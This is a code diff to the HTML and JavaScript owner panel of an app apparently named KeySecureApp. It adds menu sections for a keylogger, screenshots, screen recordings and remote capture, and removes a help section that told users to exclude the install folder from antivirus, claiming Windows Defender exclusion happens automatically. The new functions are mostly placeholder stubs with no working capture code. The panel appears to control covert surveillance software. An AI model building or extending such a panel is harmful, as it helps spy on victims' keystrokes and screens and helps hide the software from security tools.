@@ -36,8 +36,13 @@
             <button onclick="showLogs()">View Logs</button>
             <button onclick="showUsers()">Manage Users</button>
             <button onclick="showBackups()">Manage Backups</button>
+            <button onclick="showKeylogger()">Keylogger</button>
+            <button onclick="showScreenshots()">Screenshots</button>
+            <button onclick="showVideos()">Videos</button>
+            <button onclick="showNotifications()">Notifications</button>
+            <button onclick="captureScreenshot()">Capture Screenshot</button>
+            <button onclick="recordVideo()">Record Video</button>
             <button onclick="downloadKey()">Download Auth Key</button>
-            <button onclick="showAVHelp()">AV Exclusion Help</button>
             <button onclick="logout()">Logout</button>
         </div>
         <div class="settings-section hidden" id="settings-section">
@@ -61,33 +66,50 @@
         <div class="settings-section hidden" id="logs-section">
             <h3>System Logs</h3>
             <pre id="logs-content">[Logs loading... feature to be implemented]</pre>
+            <button onclick="refreshLogs()">Refresh</button>
             <button onclick="hideLogs()">Close</button>
         </div>
         <div class="settings-section hidden" id="users-section">
             <h3>Manage Users</h3>
-            <div>[User management feature to be implemented]</div>
+            <div>
+                <label>Add User: <input type="text" id="add-user-name" placeholder="Username"></label>
+                <button onclick="addUser()">Add</button>
+                <ul id="user-list"></ul>
+            </div>
             <button onclick="hideUsers()">Close</button>
         </div>
         <div class="settings-section hidden" id="backups-section">
             <h3>Manage Backups</h3>
-            <div>[Backup management feature to be implemented]</div>
+            <div>
+                <button onclick="listBackups()">List Backups</button>
+                <ul id="backup-list"></ul>
+                <button onclick="deleteAllBackups()">Delete All Backups</button>
+            </div>
             <button onclick="hideBackups()">Close</button>
         </div>
-        <div class="settings-section hidden" id="av-section">
-            <h3>Antivirus Exclusion Instructions</h3>
-            <div>
-                <p>Add the following folder to your antivirus/malware exclusions:</p>
-                <pre id="av-path"></pre>
-                <p>For Windows Defender, this is done automatically. For other AV, please add manually.</p>
-            </div>
-            <button onclick="hideAVHelp()">Close</button>
+        <div class="settings-section hidden" id="keylogger-section">
+            <h3>Keylogger</h3>
+            <pre id="keylogger-content">[Keylogger logs loading... feature to be implemented]</pre>
+            <button onclick="hideKeylogger()">Close</button>
+        </div>
+        <div class="settings-section hidden" id="screenshots-section">
+            <h3>Screenshots</h3>
+            <div id="screenshots-content">[Screenshots loading... feature to be implemented]</div>
+            <button onclick="hideScreenshots()">Close</button>
+        </div>
+        <div class="settings-section hidden" id="videos-section">
+            <h3>Screen Recordings</h3>
+            <div id="videos-content">[Videos loading... feature to be implemented]</div>
+            <button onclick="hideVideos()">Close</button>
+        </div>
+        <div class="settings-section hidden" id="notifications-section">
+            <h3>Notifications</h3>
+            <div id="notifications-content">[Notifications loading... feature to be implemented]</div>
+            <button onclick="hideNotifications()">Close</button>
         </div>
     </div>
 </div>
 <script>
-const installPath = (navigator.platform.startsWith("Win"))
-    ? "%APPDATA%\\KeySecureApp"
-    : "~/.keysecureapp";
 function login() {
     const password = document.getElementById('password').value;
     const phrase = document.getElementById('phrase').value;
@@ -141,21 +163,66 @@ function updateSettings() {
 }
 function showLogs() {
     document.getElementById('logs-section').classList.remove('hidden');
+    refreshLogs();
 }
 function hideLogs() {
     document.getElementById('logs-section').classList.add('hidden');
 }
+function refreshLogs() {
+    fetch('/storage/upload?logs=1') // Placeholder: replace with real logs endpoint
+        .then(r => r.ok ? r.text() : '[Logs not available]')
+        .then(txt => document.getElementById('logs-content').textContent = txt)
+        .catch(() => document.getElementById('logs-content').textContent = '[Logs not available]');
+}
 function showUsers() {
     document.getElementById('users-section').classList.remove('hidden');
+    loadUsers();
 }
 function hideUsers() {
     document.getElementById('users-section').classList.add('hidden');
 }
+function addUser() {
+    const name = document.getElementById('add-user-name').value.trim();
+    if (!name) return;
+    // Placeholder: send to server
+    const li = document.createElement('li');
+    li.textContent = name + " ";
+    const delBtn = document.createElement('button');
+    delBtn.textContent = "Remove";
+    delBtn.onclick = () => li.remove();
+    li.appendChild(delBtn);
+    document.getElementById('user-list').appendChild(li);
+    document.getElementById('add-user-name').value = '';
+}
+function loadUsers() {
+    // Placeholder: fetch user list from server if implemented
+    document.getElementById('user-list').innerHTML = '';
+}
 function showBackups() {
     document.getElementById('backups-section').classList.remove('hidden');
+    listBackups();
 }
 function hideBackups() {
     document.getElementById('backups-section').classList.add('hidden');
+}
+function listBackups() {
+    // Placeholder: fetch backup list from server if implemented
+    const backups = ["backup1.zip", "backup2.zip"]; // Example
+    const ul = document.getElementById('backup-list');
+    ul.innerHTML = '';
+    backups.forEach(b => {
+        const li = document.createElement('li');
+        li.textContent = b + " ";
+        const delBtn = document.createElement('button');
+        delBtn.textContent = "Delete";
+        delBtn.onclick = () => li.remove();
+        li.appendChild(delBtn);
+        ul.appendChild(li);
+    });
+}
+function deleteAllBackups() {
+    // Placeholder: send delete all backups request to server
+    document.getElementById('backup-list').innerHTML = '';
 }
 function downloadKey() {
     fetch('/owner/api/auth-key')
@@ -168,12 +235,45 @@ function downloadKey() {
             a.click();
         });
 }
-function showAVHelp() {
-    document.getElementById('av-section').classList.remove('hidden');
-    document.getElementById('av-path').textContent = installPath;
+function showKeylogger() {
+    document.getElementById('keylogger-section').classList.remove('hidden');
+    // Placeholder: fetch keylogger logs from server if implemented
+    document.getElementById('keylogger-content').textContent = '[Keylogger logs loading... feature to be implemented]';
 }
-function hideAVHelp() {
-    document.getElementById('av-section').classList.add('hidden');
+function hideKeylogger() {
+    document.getElementById('keylogger-section').classList.add('hidden');
+}
+function showScreenshots() {
+    document.getElementById('screenshots-section').classList.remove('hidden');
+    // Placeholder: fetch screenshots from server if implemented
+    document.getElementById('screenshots-content').textContent = '[Screenshots loading... feature to be implemented]';
+}
+function hideScreenshots() {
+    document.getElementById('screenshots-section').classList.add('hidden');
+}
+function showVideos() {
+    document.getElementById('videos-section').classList.remove('hidden');
+    // Placeholder: fetch videos from server if implemented
+    document.getElementById('videos-content').textContent = '[Videos loading... feature to be implemented]';
+}
+function hideVideos() {
+    document.getElementById('videos-section').classList.add('hidden');
+}
+function showNotifications() {
+    document.getElementById('notifications-section').classList.remove('hidden');
+    // Placeholder: fetch notifications from server if implemented
+    document.getElementById('notifications-content').textContent = '[Notifications loading... feature to be implemented]';
+}
+function hideNotifications() {
+    document.getElementById('notifications-section').classList.add('hidden');
+}
+function captureScreenshot() {
+    alert("Screenshot will be captured and saved in the OS-specific folder. (Feature to be implemented)");
+    // Would trigger screenshot capture on the client and refresh the Screenshots section
+}
+function recordVideo() {
+    alert("Video recording will start/stop and save in the OS-specific folder. (Feature to be implemented)");
+    // Would trigger video recording on the client and refresh the Videos section
 }
 </script>
 </body>
